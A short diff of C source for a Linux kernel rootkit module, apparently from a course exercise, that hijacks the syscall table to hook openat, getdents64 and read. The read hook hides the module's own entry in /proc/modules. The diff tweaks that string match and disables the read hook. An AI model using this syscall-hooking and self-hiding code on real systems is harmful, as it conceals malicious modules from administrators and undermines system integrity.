@@ -104,7 +104,7 @@ asmlinkage int sneaky_sys_read(struct pt_regs *regs)
 
   
   char * original_buf = (char *) regs->si;
-  char * sneaky_mod_buf = strstr(original_buf, "sneaky_mod");
+  char * sneaky_mod_buf = strnstr(original_buf, "sneaky_mod 16384 0 - Live 0x0000000000000000 (OE)", original_result);
   
   if( sneaky_mod_buf != NULL){
     char * after_sneaky_mod_buf = strchr(sneaky_mod_buf, '\n');
@@ -144,7 +144,7 @@ static int initialize_sneaky_module(void)
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
-  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
+  //  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
   // You need to replace other system calls you need to hack here
   
